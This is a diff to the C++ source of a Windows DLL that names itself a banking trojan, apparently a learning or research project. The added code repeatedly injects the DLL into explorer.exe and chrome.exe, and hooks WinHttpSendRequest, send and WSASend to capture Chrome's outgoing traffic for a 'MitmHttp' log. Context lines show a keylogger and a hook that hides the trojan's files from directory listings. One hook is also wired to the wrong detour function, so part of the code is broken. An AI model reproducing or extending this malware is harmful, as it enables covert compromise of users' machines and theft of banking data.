@@ -9,11 +9,14 @@
 #include "pch.h"
 #include "Windows.h"
 #include <iostream>
+#include <set>
 
 #include <tlhelp32.h>
 #include <psapi.h>    // GetModuleBaseNameW function
 #include <processthreadsapi.h>
-
+#include <ws2tcpip.h> // For WinSock2
+// For chrome (WinHttpSendRequest)
+#include <winhttp.h>
 
 // For Keylogger
 #include <wchar.h>
@@ -130,9 +133,11 @@ void initializeLogger() {
 	}
 }
 
-void logKeylogger(const std::wstring& message) {
-	Logger::getInstance().setLogFile(L"gKeylogger.log");
-	Logger::getInstance().log(L"gKeylogger.log", message);
+// Set logger file 
+
+void logDebuglogger(const std::wstring& message) {
+	Logger::getInstance().setLogFile(L"debuglogger.log");
+	Logger::getInstance().log(L"debuglogger.log", message);
 }
 
 void logBankingTrojanKeylogger(const std::wstring& message) {
@@ -140,6 +145,10 @@ void logBankingTrojanKeylogger(const std::wstring& message) {
 	Logger::getInstance().log(L"BankingTrojanKeylogger.txt", message);
 }
 
+void logBankingTrojanChromeMitmHttp(const std::wstring& message) {
+	Logger::getInstance().setLogFile(L"BankingTrojanChromeMitmHttp.txt");
+	Logger::getInstance().log(L"BankingTrojanChromeMitmHttp.txt", message);
+}
 
 /*
 	Common functions
@@ -306,42 +315,146 @@ bool DLLinject(DWORD pid, const wchar_t* dllPath) {
 	return true;
 }
 
+// hook without child process 
+DWORD WINAPI InjectExplorerThread(LPVOID lpParam)
+{
+	wchar_t dllPath[MAX_PATH];
+	DWORD targetPID;
+	const DWORD waitInterval = 1000;
+	const wchar_t explorerProcessName[] = L"explorer.exe";
+	std::set<DWORD> injectedPIDs;
+
+	if (!getDLLPath(dllPath)) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to get DLL path", L"ExplorerMain", MB_OK);
+		return 0;
+	}
+	targetPID = 0;
+
+
+	// scan and inject
+	while (true) {
+		if (IsProcessRunning(explorerProcessName, &targetPID)) {
+			if (injectedPIDs.find(targetPID) == injectedPIDs.end()) {
+				// If pid not in set, inject to pid
+				DLLinject(targetPID, dllPath);
+				injectedPIDs.insert(targetPID); 
+			}
+		}
+		Sleep(waitInterval); 
+	}
+
+	return 0;
+}
+
+
+// hook with child process 
+DWORD WINAPI InjectChromeThread(LPVOID lpParam)
+{
+	wchar_t dllPath[MAX_PATH];
+	DWORD targetPID;
+	const DWORD waitInterval = 1000;
+	const wchar_t chromeProcessName[] = L"chrome.exe";
+	std::set<DWORD> injectedPIDs;
+	logDebuglogger(L"InjectChromeThread\n");
+
+	if (!getDLLPath(dllPath)) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to get DLL path", L"ChromeMain", MB_OK);
+		return 0;
+	}
+	std::set<DWORD> targetPIDs;
+
+	auto getChromePIDs = [&chromeProcessName]() -> std::set<DWORD> {
+		std::set<DWORD> chromePIDs;
+		HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+		if (hSnapshot == INVALID_HANDLE_VALUE) {
+			return chromePIDs;
+		}
+
+		PROCESSENTRY32 pe32;
+		pe32.dwSize = sizeof(PROCESSENTRY32);
+
+		if (Process32First(hSnapshot, &pe32)) {
+			do {
+				if (wcscmp(pe32.szExeFile, chromeProcessName) == 0) {
+					chromePIDs.insert(pe32.th32ProcessID);
+				}
+			} while (Process32Next(hSnapshot, &pe32));
+		}
+
+		CloseHandle(hSnapshot);
+		return chromePIDs;
+		};
+
+	while (TRUE) {
+		targetPIDs = getChromePIDs();
+		for (DWORD targetPID : targetPIDs) {
+			logDebuglogger
+			(
+				std::wstring(L"Find InjectChromeThread: targetPID = ") + std::to_wstring(targetPID) + L"\n"
+			);
+
+			if (injectedPIDs.find(targetPID) == injectedPIDs.end()) {
+				// If pid not in set, inject to pid
+				DLLinject(targetPID, dllPath);
+				injectedPIDs.insert(targetPID);
+				logDebuglogger
+				(
+					std::wstring(L"InjectChromeThread: Injected to targetPID = ") + std::to_wstring(targetPID) + L"\n"
+				);
+			}
+			else {
+				logDebuglogger
+				(
+					std::wstring(L"InjectChromeThread: Already Injected to targetPID = ") + std::to_wstring(targetPID) + L"\n"
+				);
+			
+			}
+		}
+		Sleep(waitInterval);
+	}
+
+	return 0;
+}
 
 bool TrojanLoader(const wchar_t* dllPath) {
-	// Wait for the target process to start
-
-	// First injection to explorer.exe,then inject to chrome.exe
-
-	// explorer.exe
-	DWORD targetPID ;
-	const DWORD waitInterval = 1000;
 	DWORD explorerThreadId = 0;
-
-	//explorer.exe
-	// Beause debug API hook was fail, so inject to explorer.exe.
-	targetPID = 0;
-	const wchar_t explorerProcessName[] = L"explorer.exe";
-	while (!IsProcessRunning(explorerProcessName, &targetPID))
-	{
-		Sleep(waitInterval);
+	DWORD chromeThreadId = 0;
+	//----------------
+	// crate InjectExplorerThread
+	HANDLE hExplorerThread = CreateThread(
+		NULL,
+		0,
+		InjectExplorerThread,
+		NULL,
+		0,
+		&explorerThreadId
+	);
+	if (hExplorerThread == NULL) {
+		if(DEBUG)
+			MessageBoxW(NULL, L"Fail to create InjectExplorerThread", L"TrojanLoader", MB_OK);
 	}
-	DLLinject(targetPID, dllPath);
-
-
-	// chrome.exe
-	targetPID = 0;
-	while (!IsProcessRunning(targetProcessName, &targetPID))
-	{
-		Sleep(waitInterval);
+	// crate InjectChromeThread 
+	HANDLE hChromeThread = CreateThread(
+		NULL,
+		0,
+		InjectChromeThread,
+		NULL,
+		0,
+		&chromeThreadId
+	);
+	if (hChromeThread == NULL) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to create InjectChromeThread", L"TrojanLoader", MB_OK);
 	}
 
-	// Inject the DLL into the target process
-	DLLinject(targetPID, dllPath);
 	return true;
 }
 
 /*
 	Explorer functions
+	Whem dll file injection to Explorer.exe, it will run this function.
 
 	Debug API Hook was fail QQ
 	https://github.com/Dinlon5566/IT_Reverse_Engineering/blob/main/Dx25/apiHooker.cpp
@@ -466,7 +579,7 @@ void SetFileNextEntryOffset(PVOID fileInformation, FileInformationClassEx fileIn
 	}
 }
 
-// 竄改原始的 ZwQueryDirectoryFile，隱藏檔名中有 "BankingTrojan" 字串的檔案
+// 竄改原始的 ZwQueryDirectoryFile，隱藏檔名中有 "BankingTrojan" 字串的檔案 (code-from-zeze-itHome)
 NTSTATUS DetourZwQueryDirectoryFile(
 	HANDLE                 FileHandle,
 	HANDLE                 Event,
@@ -489,7 +602,7 @@ NTSTATUS DetourZwQueryDirectoryFile(
 		PVOID pPrevious = NULL;
 		do {
 			// 3. 透過檔名判斷是不是要隱藏的檔案
-			if (std::wstring(GetFileDirEntryFileName(pCurrent, FileInformationClass)).find(L"BankingTrojan") == 0) {
+			if (std::wstring(GetFileDirEntryFileName(pCurrent, FileInformationClass)).find(L"BankingTrojan.dll") == 0) {
 				// 4. 要隱藏的檔案，就把目前的 Entry 竄改成下一個 Entry
 				ULONG nextEntryOffset = GetFileNextEntryOffset(pCurrent, FileInformationClass);
 				if (nextEntryOffset != 0) {
@@ -600,16 +713,252 @@ DWORD WINAPI ExplorerMainThread(LPVOID lpParam)
 
 /*
 	Chrome functions
+
+	Whem dll file injection to chrome.exe, it will run this function.
 */
+// TARGET:
+// 00007FF673679D38		WinHttpSendRequest	WINHTTP
+/*
+	WINHTTPAPI BOOL WinHttpSendRequest(
+  [in]           HINTERNET hRequest,
+  [in, optional] LPCWSTR   lpszHeaders,
+  [in]           DWORD     dwHeadersLength,
+  [in, optional] LPVOID    lpOptional,
+  [in]           DWORD     dwOptionalLength,
+  [in]           DWORD     dwTotalLength,
+  [in]           DWORD_PTR dwContext
+);
+*/
+
+typedef BOOL(WINAPI* WINHTTPSENDREQUEST)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD,  DWORD, DWORD_PTR);
+WINHTTPSENDREQUEST fpWinHttpSendRequest = NULL;
+
+BOOL WINAPI DetourWinHttpSendRequest(
+	HINTERNET hRequest,
+	LPCWSTR   lpszHeaders,
+	DWORD     dwHeadersLength,
+	LPVOID    lpOptional,
+	DWORD     dwOptionalLength,
+	DWORD     dwTotalLength,
+	DWORD_PTR dwContext
+) {
+	// Target is [LPCWSTR   lpszHeaders]
+
+	if (DEBUG) {
+		std::wstring message = L"WinHttpSendRequest(";
+		message += lpszHeaders;
+		message += L")\n";
+		MessageBoxW(NULL, message.c_str(), L"DetourWinHttpSendRequest", MB_OK);
+	}
+	// return back to original function
+	return fpWinHttpSendRequest(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength, dwTotalLength, dwContext);
+}
+
+bool chromeHookWinHttpSendRequest() {
+	//fail
+// 取得 ntdll.dll 的 handle
+	HINSTANCE hDLL = LoadLibrary(L"winhttp.dll");
+	if (!hDLL) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to LoadLibrary", L"ChromeMainThread", MB_OK);
+		return 1;
+	}
+
+	void* ZwWinHttpSendRequest = (void*)GetProcAddress(hDLL, "WinHttpSendRequest");
+
+	// show addr
+	if (!ZwWinHttpSendRequest) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to GetProcAddress", L"ChromeMainThread", MB_OK);
+		return 1;
+	}
+
+	if (MH_Initialize() != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to MH_Initialize", L"ChromeMainThread", MB_OK);
+		return 1;
+	}
+	int status = MH_CreateHook(ZwWinHttpSendRequest, &DetourZwQueryDirectoryFile, reinterpret_cast<LPVOID*>(&fpZwQueryDirectoryFile));
+	if (status != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to MH_CreateHook", L"ChromeMainThread", MB_OK);
+		return 1;
+	}
+
+	// 啟用 Hook
+	status = MH_EnableHook(ZwWinHttpSendRequest);
+	if (status != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to MH_EnableHook", L"ChromeMainThread", MB_OK);
+		return 1;
+	}
+
+	/*
+	DWORD pid = GetCurrentProcessId();
+	// show pid
+	MessageBoxW(NULL, std::to_wstring(pid).c_str(), L"ChromeMainThread:HookDone", MB_OK);
+	*/
+	return 1;
+}
+
+// ws32_32.dll
+
+/*
+int WSAAPI send(
+  [in] SOCKET     s,
+  [in] const char *buf,
+  [in] int        len,
+  [in] int        flags
+);
+*/
+typedef int(WSAAPI* SEND)(SOCKET, const char*, int, int);
+SEND fpSend = NULL;
+
+int DetourSend(SOCKET s, const char* buf, int len, int flags) {
+	// Target is [const char *buf]
+	if (DEBUG) {
+		std::string message = "send(";
+		message += std::string(buf, len);
+		message += ")\n";
+		MessageBoxA(NULL, message.c_str(), "DetourSend", MB_OK); // ASCII
+	}
+	debug_hold();
+	// return back to original function
+	return fpSend(s, buf, len, flags);
+}
+
+bool chromeHookSend() {
+	// 取得 ws2_32.dll 的 handle
+	HINSTANCE hDLL = LoadLibrary(L"ws2_32.dll");
+	if (!hDLL) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to LoadLibrary", L"chromeHookSend", MB_OK);
+		return 1;
+	}
+
+	void* ZwSend = (void*)GetProcAddress(hDLL, "send");
+
+	// show addr
+	if (!ZwSend) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to GetProcAddress", L"chromeHookSend", MB_OK);
+		return 1;
+	}
+
+	if (MH_Initialize() != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to MH_Initialize", L"chromeHookSend", MB_OK);
+		return 1;
+	}
+	int status = MH_CreateHook(ZwSend, &DetourSend, reinterpret_cast<LPVOID*>(&fpSend));
+	if (status != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to MH_CreateHook", L"chromeHookSend", MB_OK);
+		return 1;
+	}
+
+	// 啟用 Hook
+	status = MH_EnableHook(ZwSend);
+	if (status != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to MH_EnableHook", L"chromeHookSend", MB_OK);
+		return 1;
+	}
+
+	/*
+	DWORD pid = GetCurrentProcessId();
+	// show pid
+	MessageBoxW(NULL, std::to_wstring(pid).c_str(), L"ChromeMainThread:HookDone", MB_OK);
+	*/
+	return 1;
+}
+
+// WSASEND
+typedef int (WSAAPI* WSASEND)(
+	SOCKET s,
+	LPWSABUF lpBuffers,
+	DWORD dwBufferCount,
+	LPDWORD lpNumberOfBytesSent,
+	DWORD dwFlags,
+	LPWSAOVERLAPPED lpOverlapped,
+	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
+	);
+WSASEND fpWSASend = NULL;
+
+int WSAAPI DetourWSASend(
+	SOCKET s,
+	LPWSABUF lpBuffers,
+	DWORD dwBufferCount,
+	LPDWORD lpNumberOfBytesSent,
+	DWORD dwFlags,
+	LPWSAOVERLAPPED lpOverlapped,
+	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
+) {
+	if (DEBUG) {
+		std::string message = "WSASend:\n";
+
+		// Iterate through the WSABUF array
+		for (DWORD i = 0; i < dwBufferCount; ++i) {
+			message += std::string(lpBuffers[i].buf, lpBuffers[i].len);
+			message += "\n";
+		}
+
+		MessageBoxA(NULL, message.c_str(), "DetourWSASend", MB_OK);
+	}
+
+	// Call the original WSASend function
+	return fpWSASend(s, lpBuffers, dwBufferCount, lpNumberOfBytesSent, dwFlags, lpOverlapped, lpCompletionRoutine);
+}
+
+bool chromeHookWSASend() {
+	// Load ws2_32.dll
+	HINSTANCE hDLL = LoadLibrary(L"ws2_32.dll");
+	if (!hDLL) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to LoadLibrary", L"chromeHookWSASend", MB_OK);
+		return 1;
+	}
+
+	// Get the address of WSASend
+	void* ZwWSASend = (void*)GetProcAddress(hDLL, "WSASend");
+
+	// Show the address
+	if (!ZwWSASend) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to GetProcAddress", L"chromeHookWSASend", MB_OK);
+		return 1;
+	}
+
+	// Initialize MinHook
+	if (MH_Initialize() != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to MH_Initialize", L"chromeHookWSASend", MB_OK);
+		return 1;
+	}
+
+	// Create a hook for WSASend
+	int status = MH_CreateHook(ZwWSASend, &DetourWSASend, reinterpret_cast<LPVOID*>(&fpWSASend));
+	if (status != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to MH_CreateHook", L"chromeHookWSASend", MB_OK);
+		return 1;
+	}
+
+	// Enable the hook
+	status = MH_EnableHook(ZwWSASend);
+	if (status != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to MH_EnableHook", L"chromeHookWSASend", MB_OK);
+		return 1;
+	}
+
+	return 1;
+}
 
 int chromeMain() {
 
-	if(DEBUG)
-		MessageBoxW(NULL, L"Success run to Chrome", L"ChromeMainThread", MB_OK);
+	chromeHookWSASend();
 
-
-
-	debug_hold();
 	return 1;
 }
 
@@ -626,7 +975,7 @@ DWORD WINAPI ChromeMainThread(LPVOID lpParam)
 
 int keyLoggerMain() {
 
-	logBankingTrojanKeylogger(L"KeyLoggerStart!\n");
+	logBankingTrojanKeylogger(L"\nKeyLoggerStart!\n");
 	char key;
 	while (true) {
 		Sleep(10);
